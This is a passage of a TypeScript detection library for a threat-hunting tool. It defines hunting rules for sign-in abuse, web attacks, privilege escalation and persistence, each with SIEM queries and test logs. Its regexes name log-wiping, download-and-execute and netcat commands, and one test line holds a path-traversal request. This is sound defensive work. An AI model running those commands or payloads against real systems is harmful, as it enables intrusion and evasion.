import { huntThreats, type LogEvent } from "../logs";
import type { Confidence, Severity } from "../types";
import { parseHuntLogs, type HuntEvent, type ParsedLogs, type SourceKind } from "./events";

/**
 * Threat Hunter's detection library. Every rule is documented the same way: the hypothesis it tests, the
 * ATT&CK techniques it can evidence (only those the observed events actually show), the telemetry and fields
 * it needs, its logic, severity/confidence rules, benign explanations, tuning, limitations, ready-made hunting
 * queries for common tools, and test cases (sample lines that must and must not match) that run in the test
 * suite and in the Detection Lab.
 *
 * A detection is an observation, never a verdict: investigations weigh it against the benign explanations.
 */

export interface Technique {
  id: string;
  name: string;
}

export const TACTICS = [
  "Reconnaissance",
  "Initial Access",
  "Execution",
  "Persistence",
  "Privilege Escalation",
  "Defense Evasion",
  "Credential Access",
  "Discovery",
  "Lateral Movement",
  "Collection",
  "Command and Control",
  "Exfiltration",
  "Impact",
] as const;
export type Tactic = (typeof TACTICS)[number];

export interface RuleTest {
  name: string;
  /** A small log file: one event per line (or a whole JSON document). */
  log: string;
  file?: string;
  expect: "match" | "no_match";
}

export interface Detection {
  ruleId: string;
  /** Distinguishes several detections of one rule (e.g. per user). */
  key: string;
  title: string;
  /** What the events show, stated as facts. */
  observed: string;
  severity: Severity;
  confidence: Confidence;
  events: HuntEvent[];
  users: string[];
  ips: string[];
  hosts: string[];
}

export interface HuntRule {
  id: string;
  version: string;
  changelog: string[];
  title: string;
  tactic: Tactic;
  techniques: Technique[];
  hypothesis: string;
  requires: { sources: SourceKind[]; fields: string[] };
  logic: string;
  severityRule: string;
  /** Legitimate activity that produces the same signal. */
  benign: string[];
  tuning: string[];
  limitations: string[];
  queries: { splunk: string; sentinel: string; shell: string; notes: string };
  tests: RuleTest[];
  /** Original web/auth detections run through huntThreats; the rest through detect(). */
  legacy?: boolean;
  detect?: (p: ParsedLogs) => Detection[];
}

const uniq = <T>(xs: (T | undefined | null)[]) => [...new Set(xs.filter((x): x is T => x !== undefined && x !== null && x !== ""))];
const group = <T>(xs: T[], key: (x: T) => string | undefined) => {
  const m = new Map<string, T[]>();
  for (const x of xs) {
    const k = key(x);
    if (k) (m.get(k) ?? m.set(k, []).get(k)!).push(x);
  }
  return m;
};
const span = (ev: HuntEvent[]) => {
  const t = ev
    .map((e) => e.time)
    .filter((x): x is string => !!x)
    .sort();
  return t.length ? (t[0] === t.at(-1) ? t[0]! : `${t[0]} → ${t.at(-1)}`) : "time not recorded";
};
const det = (r: Omit<Detection, "users" | "ips" | "hosts" | "events"> & { events: HuntEvent[] }): Detection => ({
  ...r,
  events: r.events.slice(0, 20),
  users: uniq(r.events.map((e) => e.user)),
  ips: uniq(r.events.map((e) => e.ip)),
  hosts: uniq(r.events.map((e) => e.host)),
});
const T = (id: string, name: string): Technique => ({ id, name });

/* ------------------------------------------------------------- patterns */

const SHELL = /(^|\/)(ba|z|da|k)?sh(\s|$)|(^|\/)su(\s|$)|\s-(i|s)(\s|$)/;
const LOG_TAMPER =
  /(auditctl\s+(-D|-e\s*0)|systemctl\s+(stop|disable|mask)\s+(auditd|rsyslog|syslog|systemd-journald|osqueryd|falcon-sensor|wazuh-agent|ossec)|service\s+(auditd|rsyslog)\s+stop|history\s+-c|unset\s+HISTFILE|HISTFILE=\/dev\/null|(rm|shred|truncate)\s+[^|;]*\/var\/log\/|>\s*\/var\/log\/|wevtutil\s+(cl|clear-log)|Clear-EventLog|Remove-EventLog)/i;
const OFFICE = /\\(winword|excel|powerpnt|outlook|onenote|mspub|visio)\.exe$/i;
const WEB_SERVER = /(\\w3wp\.exe|\\httpd\.exe|\\nginx\.exe|\\php-cgi\.exe|\\tomcat\d*\.exe|\/(httpd|apache2|nginx|php-fpm[\d.]*|tomcat|catalina\.sh))$/i;
const CHILD_SHELL = /(\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin)\.exe|\/(ba|da|z)?sh|\/(curl|wget|nc|ncat|python\d?|perl))$/i;
const ENCODED_PS = /(powershell|pwsh)(\.exe)?\b.*\s-(e|ec|enc|enco|encod|encode|encodedcommand)\s+[A-Za-z0-9+/=]{20,}|FromBase64String\(.*\)(.*\b(iex|Invoke-Expression)\b)?/i;
const DOWNLOAD =
  /(certutil(\.exe)?\s+.*-urlcache\s+.*(-f|-split)?\s*https?:|bitsadmin(\.exe)?\s+\/transfer|mshta(\.exe)?\s+https?:|regsvr32(\.exe)?\s+.*\/i:https?:|(curl|wget)\s+[^|;]*https?:\/\/[^|;]*\|\s*(ba|z)?sh\b|(Invoke-WebRequest|iwr|Net\.WebClient|DownloadString|DownloadFile)[^;]*;?\s*.*\b(iex|Invoke-Expression)\b)/i;
const ADMIN_POLICY = /(AdministratorAccess|IAMFullAccess|PowerUserAccess|"Action"\s*:\s*"\*"|arn:aws:iam::aws:policy\/\*|admin)/i;

/* ---------------------------------------------------------- the library */

const ATTACK = (id: string) => `https://attack.mitre.org/techniques/${id.replace(".", "/")}/`;
export const techniqueUrl = ATTACK;

const LEGACY: HuntRule[] = [
  {
    id: "auth.brute-force",
    version: "1.1",
    changelog: ["1.0 Original rule.", "1.1 Cloud, Okta and Windows sign-in failures included."],
    title: "Repeated failed sign-ins from one address",
    tactic: "Credential Access",
    techniques: [T("T1110.001", "Brute Force: Password Guessing")],
    hypothesis: "Someone is guessing passwords against one or more accounts.",
    requires: { sources: ["ssh", "web_access", "json", "cloudtrail", "okta", "windows"], fields: ["time", "source IP", "outcome", "user (optional)"] },
    logic: "10 or more failed sign-ins from one source address in the logs given.",
    severityRule: "Medium when no sign-in succeeded from that address; see the success-after-failures rule when one did.",
    benign: ["A user or script with a stale saved password", "A misconfigured monitoring check", "Many users behind one office or VPN address"],
    tuning: ["Raise the threshold for addresses that are your own NAT or VPN egress.", "Exclude health-check accounts."],
    limitations: ["Doesn't see slow guessing spread over many addresses.", "Counts within the uploaded window only."],
    queries: {
      splunk:
        'index=* (sourcetype=linux_secure "Failed password") OR (sourcetype=WinEventLog:Security EventCode=4625)\n| rex "from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)"\n| stats count AS failures dc(user) AS accounts min(_time) AS first max(_time) AS last BY src_ip\n| where failures >= 10\n| sort - failures',
      sentinel:
        'union isfuzzy=true\n  (SecurityEvent | where EventID == 4625 | project TimeGenerated, IpAddress, Account = TargetUserName),\n  (Syslog | where SyslogMessage has "Failed password" | extend IpAddress = extract(@"from (\\d+\\.\\d+\\.\\d+\\.\\d+)", 1, SyslogMessage), Account = extract(@"for (?:invalid user )?(\\S+) from", 1, SyslogMessage))\n| summarize Failures = count(), Accounts = dcount(Account), First = min(TimeGenerated), Last = max(TimeGenerated) by IpAddress\n| where Failures >= 10\n| order by Failures desc',
      shell: "grep -hE 'Failed (password|publickey)' /var/log/auth.log* | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn | awk '$1 >= 10'",
      notes: "Field names (user, src_ip, IpAddress) depend on your SIEM add-ons. Limit the time range first on large indexes; the aggregation is per source address.",
    },
    tests: [
      {
        name: "12 SSH failures from one address",
        expect: "match",
        log: Array.from({ length: 12 }, (_, i) => `Oct 20 10:00:${String(i).padStart(2, "0")} web1 sshd[1]: Failed password for root from 203.0.113.9 port 4${i} ssh2`).join("\n"),
      },
      { name: "Three typos then success", expect: "no_match", log: [1, 2, 3].map((i) => `Oct 20 10:00:0${i} web1 sshd[1]: Failed password for alice from 198.51.100.4 port 5 ssh2`).join("\n") },
    ],
    legacy: true,
  },
  {
    id: "auth.success-after-failures",
    version: "1.1",
    changelog: ["1.0 Original rule.", "1.1 Cloud, Okta and Windows sign-ins included."],
    title: "Successful sign-in after many failures",
    tactic: "Initial Access",
    techniques: [T("T1110.001", "Brute Force: Password Guessing"), T("T1078", "Valid Accounts")],
    hypothesis: "A guessed or stolen password was used to sign in.",
    requires: { sources: ["ssh", "web_access", "json", "cloudtrail", "okta", "windows"], fields: ["time", "source IP", "outcome", "user"] },
    logic: "10 or more failures from one address followed by a success from the same address.",
    severityRule: "High; confidence firm, because the logs can't show whether the person who signed in was the account owner.",
    benign: ["The account owner mistyped repeatedly and then got it right", "A password manager retried an old password"],
    tuning: ["Check failures were against the same account that then succeeded (owner mistakes) or many accounts (guessing)."],
    limitations: ["Whether the session was the owner's needs confirmation from the user or device data."],
    queries: {
      splunk:
        'index=* sourcetype=linux_secure ("Failed password" OR "Accepted")\n| rex "(?<outcome>Failed|Accepted) \\S+ for (?:invalid user )?(?<user>\\S+) from (?<src_ip>\\S+)"\n| stats count(eval(outcome="Failed")) AS failures count(eval(outcome="Accepted")) AS successes values(user) AS users BY src_ip\n| where failures >= 10 AND successes > 0',
      sentinel:
        'Syslog\n| where SyslogMessage has_any ("Failed password", "Accepted")\n| extend Outcome = iff(SyslogMessage has "Accepted", "success", "failure"), IpAddress = extract(@"from (\\S+) port", 1, SyslogMessage)\n| summarize Failures = countif(Outcome == "failure"), Successes = countif(Outcome == "success") by IpAddress\n| where Failures >= 10 and Successes > 0',
      shell: "grep -hE '(Failed|Accepted) (password|publickey) for' /var/log/auth.log* | awk '{for(i=1;i<=NF;i++) if($i==\"from\") print $(i+1), $6}' | sort | uniq -c",
      notes: "Correlate the success with the user's normal devices and locations before calling it malicious.",
    },
    tests: [
      {
        name: "Failures then success",
        expect: "match",
        log: [
          ...Array.from({ length: 11 }, (_, i) => `Oct 20 10:00:${String(i).padStart(2, "0")} web1 sshd[1]: Failed password for bob from 203.0.113.7 port 1 ssh2`),
          "Oct 20 10:01:00 web1 sshd[1]: Accepted password for bob from 203.0.113.7 port 1 ssh2",
        ].join("\n"),
      },
    ],
    legacy: true,
  },
  {
    id: "auth.password-spray",
    version: "1.0",
    changelog: ["1.0 Original rule."],
    title: "Failed sign-ins across many accounts from one address",
    tactic: "Credential Access",
    techniques: [T("T1110.003", "Brute Force: Password Spraying")],
    hypothesis: "One or a few common passwords are being tried across many accounts.",
    requires: { sources: ["ssh", "web_access", "json", "cloudtrail", "okta", "windows"], fields: ["source IP", "user", "outcome"] },
    logic: "Failed sign-ins for 5 or more distinct account names from one address.",
    severityRule: "Medium; confirmed as an observation.",
    benign: ["A shared office, school or VPN address where several people mistyped", "An identity sync job with bad credentials"],
    tuning: ["Exclude your own egress addresses or require that most targeted names don't exist."],
    limitations: ["Spraying spread across many addresses isn't seen per address."],
    queries: {
      splunk:
        'index=* sourcetype=linux_secure "Failed password"\n| rex "for (?:invalid user )?(?<user>\\S+) from (?<src_ip>\\S+)"\n| stats dc(user) AS accounts count AS failures BY src_ip\n| where accounts >= 5',
      sentinel: "SecurityEvent\n| where EventID == 4625\n| summarize Accounts = dcount(TargetUserName), Failures = count() by IpAddress\n| where Accounts >= 5",
      shell: "grep -hE 'Failed password' /var/log/auth.log* | awk '{for(i=1;i<=NF;i++) if($i==\"from\") print $(i+1), $(i-1)}' | sort -u | awk '{print $1}' | uniq -c | awk '$1>=5'",
      notes: "Run per day on large datasets.",
    },
    tests: [
      {
        name: "Six accounts, one address",
        expect: "match",
        log: ["a", "b", "c", "d", "e", "f"].map((u, i) => `Oct 20 10:00:0${i} web1 sshd[1]: Failed password for invalid user ${u} from 203.0.113.8 port 1 ssh2`).join("\n"),
      },
    ],
    legacy: true,
  },
  {
    id: "web.payload",
    version: "1.0",
    changelog: ["1.0 Original rule (SQL injection, XSS, traversal, command injection, Log4Shell patterns)."],
    title: "Attack payloads in web requests",
    tactic: "Initial Access",
    techniques: [T("T1190", "Exploit Public-Facing Application")],
    hypothesis: "Someone is trying to exploit the web application. An attempt is not a success.",
    requires: { sources: ["web_access", "json"], fields: ["source IP", "path with query string", "status"] },
    logic: "Request paths matching injection, XSS, traversal, command-injection or JNDI patterns (after URL-decoding).",
    severityRule: "Medium when all were rejected; high (tentative) when any got a 2xx, because those endpoints need review.",
    benign: ["Your own security scanner or penetration test", "Search boxes where users typed code"],
    tuning: ["Exclude your scanner's addresses during scheduled tests."],
    limitations: ["Only the URL is visible in access logs, not request bodies.", "A 2xx doesn't prove the payload worked."],
    queries: {
      splunk: 'index=web sourcetype=access_combined\n| eval u=urldecode(uri)\n| regex u="(?i)(union\\s+select|<script|\\.\\./|\\$\\{jndi:)"\n| stats count values(status) AS statuses BY clientip',
      sentinel:
        'W3CIISLog\n| extend Q = url_decode(strcat(csUriStem, "?", csUriQuery))\n| where Q matches regex @"(?i)(union\\s+select|<script|\\.\\./|\\$\\{jndi:)"\n| summarize count(), Statuses = make_set(scStatus) by cIP',
      shell: "grep -iE '(union(%20|\\+| )select|%3Cscript|<script|\\.\\./|%2e%2e%2f|\\$\\{jndi:)' access.log | awk '{print $1, $9}' | sort | uniq -c | sort -rn",
      notes: "URL-decode before matching; encoded payloads are common.",
    },
    tests: [{ name: "Traversal attempt", expect: "match", log: '203.0.113.5 - - [20/Oct/2026:10:00:00 +0000] "GET /files?name=../../etc/passwd HTTP/1.1" 404 120 "-" "curl/8"' }],
    legacy: true,
  },
  {
    id: "web.scanning",
    version: "1.0",
    changelog: ["1.0 Original rule."],
    title: "Automated scanning",
    tactic: "Reconnaissance",
    techniques: [T("T1595", "Active Scanning")],
    hypothesis: "An automated scanner is mapping the site. Usually internet background noise.",
    requires: { sources: ["web_access", "json"], fields: ["source IP", "path", "status", "user agent"] },
    logic: "3+ requests for commonly attacked paths, 30+ client errors, or 3+ requests with scanner user agents from one address.",
    severityRule: "Low; medium when a probed path answered 200.",
    benign: ["Search engine crawlers", "Your uptime or security monitoring"],
    tuning: ["Ignore known crawler ranges you've verified by reverse DNS."],
    limitations: ["User agents are trivially faked."],
    queries: {
      splunk: 'index=web sourcetype=access_combined (uri_path="/.env" OR uri_path="/wp-login.php" OR uri_path="/.git/*" OR uri_path="/phpmyadmin*")\n| stats count values(status) BY clientip',
      sentinel: 'W3CIISLog\n| where csUriStem has_any ("/.env", "/wp-login.php", "/.git/", "/phpmyadmin")\n| summarize count(), make_set(scStatus) by cIP',
      shell: "grep -E '\"GET /(\\.env|wp-login\\.php|\\.git/|phpmyadmin)' access.log | awk '{print $1, $9}' | sort | uniq -c | sort -rn",
      notes: "Look closest at probes that returned 200.",
    },
    tests: [
      {
        name: "Three probes",
        expect: "match",
        log: ["/.env", "/wp-login.php", "/.git/HEAD"].map((p, i) => `203.0.113.6 - - [20/Oct/2026:10:00:0${i} +0000] "GET ${p} HTTP/1.1" 404 10 "-" "Mozilla/5.0"`).join("\n"),
      },
    ],
    legacy: true,
  },
];

const RULES_NEW: HuntRule[] = [
  {
    id: "priv.sudo-root-shell",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Root shell through sudo or su",
    tactic: "Privilege Escalation",
    techniques: [T("T1548.003", "Abuse Elevation Control Mechanism: Sudo and Sudo Caching")],
    hypothesis: "Someone obtained an interactive root shell, possibly after taking over a user account.",
    requires: { sources: ["linux_auth"], fields: ["time", "user", "sudo COMMAND / su target"] },
    logic: "Successful sudo running a shell (bash, sh, zsh, su, -i/-s) as root, or su to root. Grouped per user.",
    severityRule: "Low (routine for admins); medium when the same user had failed sudo/su attempts in the logs.",
    benign: ["Normal administration by an authorised admin", "Configuration management run interactively"],
    tuning: ["Allow-list known admin accounts and maintenance windows; alert on accounts that never did this before."],
    limitations: ["Doesn't show what was done in the shell; that needs shell history or auditd."],
    queries: {
      splunk:
        'index=* sourcetype=linux_secure "sudo:" "USER=root" "COMMAND="\n| rex "sudo:\\s+(?<sudo_user>\\S+) :.*COMMAND=(?<cmd>.*)"\n| regex cmd="(/(ba|z)?sh|/su)(\\s|$)"\n| stats count min(_time) AS first max(_time) AS last values(cmd) BY host sudo_user',
      sentinel:
        'Syslog\n| where ProcessName == "sudo" and SyslogMessage has "USER=root"\n| extend Cmd = extract(@"COMMAND=(.*)$", 1, SyslogMessage), SudoUser = extract(@"^\\s*(\\S+) :", 1, SyslogMessage)\n| where Cmd matches regex @"/(ba|z)?sh(\\s|$)|/su(\\s|$)"\n| summarize count(), First = min(TimeGenerated), Last = max(TimeGenerated) by Computer, SudoUser',
      shell: "grep -hE 'sudo: .* USER=root ; COMMAND=.*/(bash|sh|zsh|su)( |$)' /var/log/auth.log* /var/log/secure* 2>/dev/null",
      notes: "Cheap: filter on the sudo program before parsing.",
    },
    tests: [
      { name: "sudo bash", expect: "match", log: "Oct 20 11:00:00 web1 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash" },
      { name: "sudo apt", expect: "no_match", log: "Oct 20 11:00:00 web1 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update" },
    ],
    detect: (p) => {
      const ev = p.events.filter((e) => e.source === "linux_auth" && e.category === "privilege" && (e.action === "sudo" || e.action === "su"));
      const out: Detection[] = [];
      for (const [user, list] of group(ev, (e) => e.user)) {
        const shells = list.filter((e) => e.outcome === "success" && e.target === "root" && (e.action === "su" || SHELL.test(e.command ?? "")));
        if (!shells.length) continue;
        const fails = list.filter((e) => e.outcome === "failure");
        out.push(
          det({
            ruleId: "priv.sudo-root-shell",
            key: user,
            title: `${user} opened a root shell${fails.length ? ` after ${fails.length} failed attempt(s)` : ""}`,
            observed: `${shells.length} root shell(s) via ${uniq(shells.map((e) => e.action)).join("/")} by ${user} on ${uniq(shells.map((e) => e.host)).join(", ") || "unknown host"} (${span(shells)})${fails.length ? `; ${fails.length} failed sudo/su attempt(s) by the same user` : ""}.`,
            severity: fails.length ? "medium" : "low",
            confidence: "confirmed",
            events: [...fails.slice(0, 5), ...shells],
          }),
        );
      }
      return out;
    },
  },
  {
    id: "priv.admin-grant",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Administrator rights granted",
    tactic: "Privilege Escalation",
    techniques: [T("T1098", "Account Manipulation"), T("T1098.003", "Account Manipulation: Additional Cloud Roles")],
    hypothesis: "An account was given administrator rights to keep or extend access.",
    requires: { sources: ["linux_auth", "windows", "cloudtrail", "okta"], fields: ["time", "actor", "target account", "group or policy"] },
    logic:
      "Linux usermod/gpasswd to sudo/wheel/admin; Windows 4728/4732/4756 to an admin group; CloudTrail admin policy attached or AddUserToGroup to an admin group; Okta admin group membership or privilege grant.",
    severityRule: "Medium; high when the account was also created in these logs (create-then-promote).",
    benign: ["Planned onboarding or role change", "Break-glass access during an incident"],
    tuning: ["Compare with your change tickets; alert on grants outside them."],
    limitations: ["Nested group membership and changes made outside the uploaded sources aren't seen."],
    queries: {
      splunk:
        'index=* (sourcetype=WinEventLog:Security EventCode IN (4728,4732,4756)) OR (sourcetype=aws:cloudtrail eventName IN ("AttachUserPolicy","AttachRolePolicy","PutUserPolicy","AddUserToGroup"))\n| table _time host eventName EventCode user src_user Group_Name requestParameters.policyArn',
      sentinel:
        'union isfuzzy=true\n  (SecurityEvent | where EventID in (4728, 4732, 4756) | where TargetUserName in~ ("Administrators", "Domain Admins", "Enterprise Admins") | project TimeGenerated, Computer, Actor = SubjectUserName, Member = MemberName, Group = TargetUserName),\n  (AWSCloudTrail | where EventName in ("AttachUserPolicy", "AttachRolePolicy", "PutUserPolicy", "AddUserToGroup") | where RequestParameters has_any ("AdministratorAccess", "Admin") | project TimeGenerated, Actor = UserIdentityArn, EventName, RequestParameters)',
      shell:
        'jq -r \'.Records[] | select(.eventName|test("Attach(User|Role)Policy|PutUserPolicy|AddUserToGroup")) | [.eventTime,.userIdentity.arn,.eventName,(.requestParameters|tostring)] | @tsv\' cloudtrail.json\ngrep -hE "(usermod|gpasswd).*(sudo|wheel|admin)" /var/log/auth.log*',
      notes: "CloudTrail field names follow the AWSCloudTrail table in Sentinel; Splunk names depend on the AWS add-on.",
    },
    tests: [
      { name: "Linux sudo group", expect: "match", log: "Oct 20 11:05:00 web1 usermod[311]: add 'mallory' to group 'sudo'" },
      {
        name: "CloudTrail AdministratorAccess",
        expect: "match",
        file: "ct.json",
        log: JSON.stringify({
          Records: [
            {
              eventTime: "2026-10-20T11:00:00Z",
              eventSource: "iam.amazonaws.com",
              eventName: "AttachUserPolicy",
              userIdentity: { type: "IAMUser", userName: "ci" },
              sourceIPAddress: "203.0.113.20",
              requestParameters: { userName: "tmp", policyArn: "arn:aws:iam::aws:policy/AdministratorAccess" },
            },
          ],
        }),
      },
      { name: "Linux docker group", expect: "no_match", log: "Oct 20 11:05:00 web1 usermod[311]: add 'alice' to group 'video'" },
    ],
    detect: (p) => {
      const created = new Set(p.events.filter((e) => e.category === "account" && /useradd|4720|CreateUser|user\.lifecycle\.create/.test(e.action)).map((e) => e.target?.toLowerCase()));
      const grants = p.events.filter(
        (e) =>
          e.category === "privilege" &&
          // Group changes only: a sudo command runs as root but grants nothing.
          ((e.source !== "cloudtrail" && e.source !== "okta" && e.privileged && (e.action === "group_add" || /^47(28|32|56)$/.test(e.action))) ||
            (e.source === "cloudtrail" && /^(AttachUserPolicy|AttachRolePolicy|PutUserPolicy|PutRolePolicy|CreatePolicyVersion)$/.test(e.action) && ADMIN_POLICY.test(`${e.target} ${e.raw}`)) ||
            (e.source === "cloudtrail" && e.action === "AddUserToGroup" && /admin/i.test(e.target ?? "")) ||
            (e.source === "okta" && /admin|super/i.test(`${e.target} ${e.action}`))) &&
          e.outcome !== "failure",
      );
      return grants.map((e) => {
        const member = (e.target ?? "").split(/ → | ← /)[0]!.toLowerCase();
        const fresh = created.has(member);
        return det({
          ruleId: "priv.admin-grant",
          key: `${e.ref}`,
          title: `Admin rights granted: ${e.target ?? "unknown"}`,
          observed: `${e.user ?? "Someone"} granted administrator rights (${e.action}: ${e.target ?? "?"}) at ${e.time ?? "unknown time"} on ${e.host ?? e.source}.${fresh ? " The same account was created earlier in these logs." : ""}`,
          severity: fresh ? "high" : "medium",
          confidence: "confirmed",
          events: [e],
        });
      });
    },
  },
  {
    id: "persist.account-created",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "New account created",
    tactic: "Persistence",
    techniques: [T("T1136", "Create Account")],
    hypothesis: "An attacker created an account to keep access.",
    requires: { sources: ["linux_auth", "windows", "cloudtrail", "okta"], fields: ["time", "actor", "new account"] },
    logic: "useradd/adduser, Windows 4720, CloudTrail CreateUser/CreateLoginProfile, Okta user.lifecycle.create.",
    severityRule: "Low alone; investigations raise it when the account is then given admin rights or signs in from an unusual source.",
    benign: ["Onboarding", "Service accounts created by deployment tooling"],
    tuning: ["Match against your HR/onboarding system or change tickets."],
    limitations: ["Accounts in sources you haven't uploaded aren't seen."],
    queries: {
      splunk:
        'index=* (sourcetype=WinEventLog:Security EventCode=4720) OR (sourcetype=aws:cloudtrail eventName IN ("CreateUser","CreateLoginProfile")) OR (sourcetype=linux_secure "new user:")\n| table _time host user src_user eventName',
      sentinel:
        'union isfuzzy=true (SecurityEvent | where EventID == 4720 | project TimeGenerated, Computer, Actor = SubjectUserName, NewAccount = TargetUserName), (AWSCloudTrail | where EventName in ("CreateUser", "CreateLoginProfile") | project TimeGenerated, Actor = UserIdentityArn, RequestParameters)',
      shell: "grep -h 'new user: name=' /var/log/auth.log* /var/log/secure* 2>/dev/null",
      notes: "Low volume in most environments; no aggregation needed.",
    },
    tests: [{ name: "useradd", expect: "match", log: "Oct 20 11:04:00 web1 useradd[300]: new user: name=mallory, UID=1002, GID=1002, home=/home/mallory, shell=/bin/bash" }],
    detect: (p) =>
      p.events
        .filter((e) => e.category === "account" && /^(useradd|4720|CreateUser|CreateLoginProfile|user\.lifecycle\.create)$/.test(e.action))
        .map((e) =>
          det({
            ruleId: "persist.account-created",
            key: `${e.target}:${e.ref}`,
            title: `Account created: ${e.target ?? "unknown"}`,
            observed: `${e.user ?? "Someone"} created the account ${e.target ?? "?"} (${e.action}) at ${e.time ?? "unknown time"} on ${e.host ?? e.source}.`,
            severity: "low",
            confidence: "confirmed",
            events: [e],
          }),
        ),
  },
  {
    id: "persist.credential-added",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "New credentials or MFA removed",
    tactic: "Persistence",
    techniques: [T("T1098.001", "Account Manipulation: Additional Cloud Credentials"), T("T1556.006", "Modify Authentication Process: Multi-Factor Authentication")],
    hypothesis: "Someone added a way back in (access key, API token, password) or weakened sign-in protection.",
    requires: { sources: ["cloudtrail", "okta"], fields: ["time", "actor", "target account"] },
    logic:
      "CloudTrail CreateAccessKey/CreateLoginProfile/UpdateLoginProfile for another user, DeactivateMFADevice/DeleteVirtualMFADevice; Okta system.api_token.create, user.mfa.factor.deactivate/reset_all.",
    severityRule: "Medium; MFA removal and keys created for someone else rank first.",
    benign: ["Key rotation", "A user replacing a lost phone (MFA reset by the help desk)"],
    tuning: ["Expect help-desk resets from known admin accounts; alert on others."],
    limitations: ["Keys created and used entirely outside the uploaded window aren't seen."],
    queries: {
      splunk:
        'index=* (sourcetype=aws:cloudtrail eventName IN ("CreateAccessKey","DeactivateMFADevice","DeleteVirtualMFADevice","UpdateLoginProfile")) OR (sourcetype=OktaIM2:log eventType IN ("system.api_token.create","user.mfa.factor.deactivate","user.mfa.factor.reset_all"))\n| table _time eventName eventType userIdentity.arn actor.alternateId requestParameters.userName',
      sentinel:
        'AWSCloudTrail\n| where EventName in ("CreateAccessKey", "DeactivateMFADevice", "DeleteVirtualMFADevice", "UpdateLoginProfile")\n| extend Target = tostring(parse_json(RequestParameters).userName)\n| where isnotempty(Target) and Target != UserIdentityUserName\n| project TimeGenerated, UserIdentityArn, EventName, Target, SourceIpAddress',
      shell:
        "jq -r '.Records[] | select(.eventName|test(\"CreateAccessKey|DeactivateMFADevice|DeleteVirtualMFADevice|UpdateLoginProfile\")) | [.eventTime,.userIdentity.arn,.eventName,.requestParameters.userName] | @tsv' cloudtrail.json",
      notes: "Okta's sourcetype depends on your add-on; in Sentinel the Okta table name varies by connector version.",
    },
    tests: [
      {
        name: "Key for another user",
        expect: "match",
        file: "ct.json",
        log: JSON.stringify({
          Records: [
            {
              eventTime: "2026-10-20T12:00:00Z",
              eventSource: "iam.amazonaws.com",
              eventName: "CreateAccessKey",
              userIdentity: { type: "IAMUser", userName: "ci" },
              sourceIPAddress: "203.0.113.20",
              requestParameters: { userName: "backup" },
            },
          ],
        }),
      },
      {
        name: "Own key rotation",
        expect: "no_match",
        file: "ct.json",
        log: JSON.stringify({
          Records: [
            {
              eventTime: "2026-10-20T12:00:00Z",
              eventSource: "iam.amazonaws.com",
              eventName: "CreateAccessKey",
              userIdentity: { type: "IAMUser", userName: "ci" },
              sourceIPAddress: "203.0.113.20",
              requestParameters: { userName: "ci" },
            },
          ],
        }),
      },
    ],
    detect: (p) =>
      p.events
        .filter(
          (e) =>
            (e.source === "cloudtrail" && /^(DeactivateMFADevice|DeleteVirtualMFADevice)$/.test(e.action)) ||
            (e.source === "cloudtrail" && /^(CreateAccessKey|CreateLoginProfile|UpdateLoginProfile)$/.test(e.action) && e.target && e.user && e.target.toLowerCase() !== e.user.toLowerCase()) ||
            (e.source === "okta" && /^(system\.api_token\.create|user\.mfa\.factor\.(deactivate|reset_all))$/.test(e.action)),
        )
        .filter((e) => e.outcome !== "failure")
        .map((e) =>
          det({
            ruleId: "persist.credential-added",
            key: e.ref,
            title: /mfa/i.test(e.action) ? `MFA removed for ${e.target ?? "an account"}` : `New credential for ${e.target ?? "an account"} (${e.action})`,
            observed: `${e.user ?? "Someone"} ran ${e.action}${e.target ? ` on ${e.target}` : ""} at ${e.time ?? "unknown time"} from ${e.ip ?? "unknown address"}.`,
            severity: "medium",
            confidence: "confirmed",
            events: [e],
          }),
        ),
  },
  {
    id: "persist.scheduled",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Scheduled job or service added",
    tactic: "Persistence",
    techniques: [T("T1053.003", "Scheduled Task/Job: Cron"), T("T1543.003", "Create or Modify System Process: Windows Service")],
    hypothesis: "A cron job or service was added to run code repeatedly or at start-up.",
    requires: { sources: ["linux_auth", "windows"], fields: ["time", "user", "crontab action / service name and path"] },
    logic: "crontab REPLACE or edits, Windows 4697/7045 service installs.",
    severityRule: "Low; medium when a service binary lives in a temp/user folder or runs a script host.",
    benign: ["Software installs and updates", "Admins editing their own cron jobs"],
    tuning: ["Allow-list signed software install paths; review only unusual ones."],
    limitations: ["Cron changes made by editing files directly may not be logged by crontab."],
    queries: {
      splunk: 'index=* (sourcetype=WinEventLog:System EventCode=7045) OR (sourcetype=linux_secure "crontab" ("REPLACE" OR "BEGIN EDIT"))\n| table _time host user Service_Name Service_File_Name _raw',
      sentinel:
        'Event\n| where EventLog == "System" and EventID == 7045\n| extend ServiceName = extract(@"<Data Name=\\"ServiceName\\">([^<]+)", 1, EventData), ImagePath = extract(@"<Data Name=\\"ImagePath\\">([^<]+)", 1, EventData)\n| project TimeGenerated, Computer, ServiceName, ImagePath',
      shell: "grep -hE 'crontab\\[[0-9]+\\]: \\(\\S+\\) (REPLACE|BEGIN EDIT)' /var/log/syslog* /var/log/cron* 2>/dev/null",
      notes: "Service install volume is low; cron edits can be noisy on shared hosts.",
    },
    tests: [{ name: "crontab replace", expect: "match", log: "Oct 20 11:06:00 web1 crontab[400]: (mallory) REPLACE (mallory)" }],
    detect: (p) =>
      p.events
        .filter((e) => (e.category === "account" && /^crontab (REPLACE|BEGIN EDIT)$/.test(e.action)) || /service installed/.test(e.action))
        .map((e) => {
          const risky = /\\(temp|appdata|users\\public|programdata)\\|powershell|cmd\.exe \/c|mshta|rundll32/i.test(e.command ?? "");
          return det({
            ruleId: "persist.scheduled",
            key: e.ref,
            title: /service/.test(e.action) ? `Service installed: ${e.target ?? "unknown"}` : `Cron table changed for ${e.target ?? e.user ?? "a user"}`,
            observed: `${e.action} by ${e.user ?? "unknown user"}${e.command ? ` (${e.command.slice(0, 160)})` : ""} at ${e.time ?? "unknown time"} on ${e.host ?? e.source}.`,
            severity: risky ? "medium" : "low",
            confidence: "confirmed",
            events: [e],
          });
        }),
  },
  {
    id: "evasion.logging-disabled",
